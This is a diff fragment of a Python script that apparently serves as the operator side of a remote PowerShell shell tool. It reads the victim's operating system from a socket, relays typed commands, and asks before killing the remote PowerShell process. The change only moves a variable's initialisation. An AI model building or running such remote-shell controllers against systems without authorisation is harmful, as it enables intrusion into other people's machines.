@@ -91,8 +91,8 @@ operating_system = conn.recv(1024).decode()
 print("Operating System:      " + operating_system, end="")
 operating_system = operating_system.split("\n")[0]
 threading.Thread(target=recv, args=(conn,)).start()
+last = ""
 while not stop:
-    last = ""
     stdin = input()
     if pid in stdin:
         choice = input("[!] Are you sure you want to kill this Powershell process? Y/N >> ")
